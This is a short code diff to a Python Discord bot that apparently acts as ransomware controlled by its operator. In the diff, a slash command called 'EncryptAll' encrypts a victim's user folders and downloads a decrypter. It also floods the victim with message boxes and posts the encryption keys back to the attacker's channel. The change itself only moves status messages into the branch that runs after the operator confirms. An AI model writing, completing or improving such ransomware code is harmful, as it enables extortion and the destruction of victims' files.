@@ -459,8 +459,6 @@ async def SendMessageBox_command(ctx: SlashContext):
 @slash.slash(name="EncryptAll", description="Encrypt all users files! (much easier, alot slower)", guild_ids=g)
 async def EncryptAll_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        await ctx.send("Booting up auto encrypter, Please wait. . .")
-
         PASSWORDS = []
 
         # Encrypt C: Items, Desktop, Downloads, Documents, Pictures etc...
@@ -1080,12 +1078,12 @@ async def EncryptAll_command(ctx: SlashContext):
 
         res = await client.wait_for('button_click')
         if res.component.label == "YES":
+            await ctx.send(content="Booting up auto encrypter, Please wait. . .", hidden=True)
             C_drive_desktop() # Start auto encrypter
             download_decrypter() # Download decrypter
             spam_messagebox() # Send message box
+            await ctx.send(f"```Finished encrypted everything and sent message box```\n\n**Here are the keys to decrypt the files!**\n{json.dumps(PASSWORDS, indent=6)}")
         else:
             await ctx.send(content="Cancelled!", hidden=True)
-
-        await ctx.send(f"```Finished encrypted everything and sent message box```\n\n**Here are the keys to decrypt the files!**\n{json.dumps(PASSWORDS, indent=6)}")
         
 client.run(token)
